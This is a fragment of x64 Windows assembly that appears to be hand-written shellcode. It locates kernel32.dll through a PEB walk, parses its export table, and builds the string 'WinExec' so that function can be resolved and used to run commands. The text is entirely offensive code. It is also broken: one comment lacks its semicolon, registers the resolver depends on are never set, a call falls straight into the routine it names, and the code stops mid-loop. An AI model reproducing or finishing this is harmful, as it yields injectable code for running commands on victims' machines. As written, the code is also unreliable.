section .text
	global _start
_start:
		mov rbx , gs:[0x60]
		mov rbx , [rbx + 0x18]
		add rbx , 0x20
		mov rbx , [rbx]
		mov rbx , [rbx]
		mov r8 , [rbx+20]
		
		;r8 : kernel32.dll
		
		mov ebx , [r8 + 0x3c]
		add rbx , r8 ; e_elfanew
		
		xor rcx , rcx
		mov cx , 0x88 ; exporttable rva
		add rbx , [rbx + rcx] ; rva of exporttable
		add rbx , r8 ; va of export table
		mov r9 , rbx 
		
		r9 : eporttable base
		
		xor eax , eax
		sub rsp , 16
		mov dword [rsp], 0x456E6957   ; 'WinE'
		mov word  [rsp+4], 0x6578     ; 'xe'
		mov byte  [rsp+6], 0x63       ; 'c'
		mov byte [rsp+7], al          ; write null terminator from zeroed reg
		mov rbx , rsp
		
		mov cl , 7
		call get_WinApi_fun

		get_WinApi_fun:
		; Requirements (preserved):
		;   R8  = &kernel32.dll
		;   R10 = &AddressOfFunctions (ExportTable)
		;   R11 = &AddressOfNames (ExportTable)
		;   R12 = &AddressOfNameOrdinals (ExportTable)
		; Parameters (preserved):
		;   RBX = (char*) function_name
		;   RCX = (int)   length of function_name string
		; Returns:
		;   RAX = &function
		;
		; IMPORTANT: This function doesn't handle "not found" case! 
		;            Infinite loop and access violation is possible.
		
		xor rax, rax        ; RAX = counter = 0
		push rcx            ; STACK + RCX (8) = preserve length of function_name string
 
		;loop through AddressOfNmaes array:
		;array item = function name RVA (4 bytes)
		
		loop :
		xor rdi , rdi ; rdi = 0
		mov rcx , [rsp] ; rcx = length of function_name string
		mov rsi , rbx ;rsi = (char *) function_name
		
		
